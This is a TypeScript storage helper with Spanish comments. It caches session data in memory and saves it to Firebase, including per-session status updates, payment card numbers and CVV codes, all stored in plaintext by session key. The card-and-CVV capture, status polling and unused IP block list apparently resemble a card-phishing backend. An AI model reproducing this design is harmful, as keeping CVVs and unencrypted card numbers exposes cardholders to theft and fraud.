import { FirebaseService } from './FirebaseService';

// Cache en memoria para almacenamiento rápido de datos
const memoryStorage: Record<string, string> = {};
const blockedIps: Set<string> = new Set();

// Bandera para asegurar que las IPs bloqueadas se cargaron al menos una vez
let loadedBlockedIps = false;

// Se exporta la clase StorageService para manejar almacenamiento híbrido (Memoria + Firebase)
export class StorageService {

    /**
     * Metodo encargado de guardar un valor por clave (Híbrido: Memoria + Firebase)
     * 
     * @param key 
     * @param value 
     */
    static async set(key: string, value: any): Promise<void> {

        // Se usa el try catch
        try {

            // Se guarda en memoria primero para acceso rápido
            memoryStorage[key] = JSON.stringify(value);

            // Se guarda en Firebase dependiendo del tipo de clave
            if (key.startsWith('session_')) {
                const sessionId = key.replace('session_', '');
                await FirebaseService.saveSession(sessionId, value);
            } else if (key.startsWith('status_')) {
                const sessionId = key.replace('status_', '');
                const statusTick = Date.now();
                await FirebaseService.saveSession(sessionId, {
                    lastStatus: value,
                    statusTick,
                });
                memoryStorage[`status_tick_${sessionId}`] = JSON.stringify(statusTick);
            } else if (key.startsWith('cardData_tc_')) {
                const sessionId = key.replace('cardData_tc_', '');
                await FirebaseService.saveSession(sessionId, { cardData_tc: value });
            } else if (key.startsWith('cardData_cvv_')) {
                const sessionId = key.replace('cardData_cvv_', '');
                await FirebaseService.saveSession(sessionId, { cardData_cvv: value });
            }
        } catch (error) {
            console.error(`Error saving key ${key}:`, error);
        }
    }

    /**
     * Metodo encargado de obtener un valor por clave (Híbrido: Memoria -> Firebase)
     * 
     * @param key 
     * @returns 
     */
    static async get(key: string): Promise<any> {
        try {
            const item = memoryStorage[key];
            if (item) {
                return JSON.parse(item);
            }

            if (key.startsWith('session_')) {
                const sessionId = key.replace('session_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data) {
                    memoryStorage[key] = JSON.stringify(data);
                    return data;
                }
            } else if (key.startsWith('status_')) {
                const sessionId = key.replace('status_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data?.lastStatus) {
                    memoryStorage[key] = JSON.stringify(data.lastStatus);
                    return data.lastStatus;
                }
            } else if (key.startsWith('cardData_tc_')) {
                const sessionId = key.replace('cardData_tc_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data?.cardData_tc) {
                    memoryStorage[key] = JSON.stringify(data.cardData_tc);
                    return data.cardData_tc;
                }
            } else if (key.startsWith('cardData_cvv_')) {
                const sessionId = key.replace('cardData_cvv_', '');
                const data = await FirebaseService.getSession(sessionId);
                if (data?.cardData_cvv) {
                    memoryStorage[key] = JSON.stringify(data.cardData_cvv);
                    return data.cardData_cvv;
                }
            }

            return null;
        } catch (error) {
            console.error(`Error retrieving key ${key}:`, error);
            return null;
        }
    }

    /**
     * Metodo encargado de eliminar un valor por clave
     * 
     * @param key 
     */
    static async remove(key: string): Promise<void> {

        // Se elimina del almacenamiento en memoria
        delete memoryStorage[key];
    }

    /**
     * Metodo encargado de actualizar un valor por clave (merge)
     * 
     * @param key 
     * @param updates 
     * @returns 
     */
    static async update(key: string, updates: any): Promise<any> {

        // Se obtiene el valor actual
        const current = await this.get(key) || {};

        // Se mezcla el valor actual con las actualizaciones
        const updated = { ...current, ...updates };

        // Se guarda el valor actualizado
        await this.set(key, updated);

        // Se retorna el valor actualizado
        return updated;
    }

    /**
     * Metodo encargado de obtener todas las claves del almacenamiento en memoria
     * 
     * @returns 
     */
    static getAllKeys(): string[] {

        // Se retornan las claves del almacenamiento en memoria
        return Object.keys(memoryStorage);
    }
}
